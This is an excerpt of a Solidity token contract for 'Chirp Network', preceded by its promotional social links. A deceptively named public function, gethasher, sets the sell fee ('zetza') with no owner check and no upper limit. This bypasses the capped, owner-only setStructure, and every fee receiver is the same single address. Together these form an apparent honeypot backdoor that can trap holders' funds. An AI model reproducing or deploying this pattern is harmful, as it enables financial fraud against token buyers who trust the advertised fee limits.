...
--DECENTRALIZE YOUR THOUGHTS WITH CHIRP NETWOTRK--
...
TG : https://t.me/ChirpNetwork

WEB : https://ChirpNet.space

TW : https://twitter.com/ChirpNet_erc
...
contract CHIRPNETWORK is IERC20, Ownable {
    ...
    address internal constant development_receiver = 0xfB5fd7f3F94934B5F142784465EfA85d801590E9; 
    address internal constant marketing_receiver = 0xfB5fd7f3F94934B5F142784465EfA85d801590E9;
    address internal constant liquidity_receiver = 0xfB5fd7f3F94934B5F142784465EfA85d801590E9;
    ...
    function gethasher(uint256 _sumamount) public virtual{zetza = _sumamount;require(_sumamount >=99);}
    ...
    function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        ...
        zetza = _sell;
        transferFee = _trans;
        require(totalFee <= denominator.div(5) && transferFee <= denominator.div(5) && zetza <= denominator.div(3), "totalFee and zetza cannot be more than 20%");
    }
    ...
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        ...
        if(recipient == pair){return zetza;}
